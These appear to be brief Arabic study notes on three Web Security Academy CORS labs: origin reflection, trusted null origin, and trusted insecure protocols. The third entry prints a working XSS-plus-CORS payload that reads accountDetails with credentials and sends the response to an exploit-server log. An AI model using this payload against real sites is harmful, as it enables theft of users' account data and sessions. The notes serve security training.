

---
1) Lab: CORS vulnerability with basic origin reflection
	هو هنا الاب بيقبل اى دومين فهتكتب payload وتدخله على الاكسبلويت وتاخد البيانات من الاكسس لوج وتعمل ليها ان كود وتاخد السيشن وتغير الكوكوى من الموقع 
---
2) Lab: CORS vulnerability with trusted null origin
	 هنا الحل المختلف عن الاب ال فات ان نوع origin = null  وتكتب الكود الخاص بيها وتكمل عادى 
---
3) Lab: CORS vulnerability with trusted insecure protocols
	الاختلاف هنا  Origin: subdomain.lab-id 
	```
	<script>

    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"

	</script>
	```
---
